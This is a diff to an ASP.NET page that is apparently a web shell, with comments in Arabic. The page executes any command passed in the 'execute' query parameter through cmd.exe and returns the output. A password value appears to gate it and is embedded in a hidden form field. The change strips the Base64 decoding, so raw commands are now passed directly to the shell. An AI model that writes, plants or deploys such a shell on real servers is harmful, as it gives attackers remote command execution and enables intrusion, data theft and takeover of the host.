@@ -1,6 +1,5 @@
 <%@ Page Language="C#" Debug="false" %>
 <%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.Text" %>
 
 <script runat="server">
     protected void Page_Load(object sender, EventArgs e)
@@ -16,13 +15,9 @@
                 {
                     try
                     {
-                        // فك تشفير الأمر من Base64
-                        byte[] data = Convert.FromBase64String(cmdCommand);
-                        string decodedCommand = Encoding.UTF8.GetString(data);
-
                         ProcessStartInfo psi = new ProcessStartInfo();
                         psi.FileName = "cmd.exe";
-                        psi.Arguments = "/c " + decodedCommand;
+                        psi.Arguments = "/c " + cmdCommand;
                         psi.RedirectStandardOutput = true;
                         psi.RedirectStandardError = true;
                         psi.UseShellExecute = false;
@@ -55,7 +50,7 @@
                 // إذا لم يتم إدخال أمر، اعرض النموذج لإدخال الأمر
                 Response.Write(@"
                     <form method='get'>
-                        Command (Base64 Encoded): <input type='text' name='execute' />
+                        Command: <input type='text' name='execute' />
                         <input type='hidden' name='password' value='28112016' />
                         <input type='submit' value='Execute' />
                     </form>
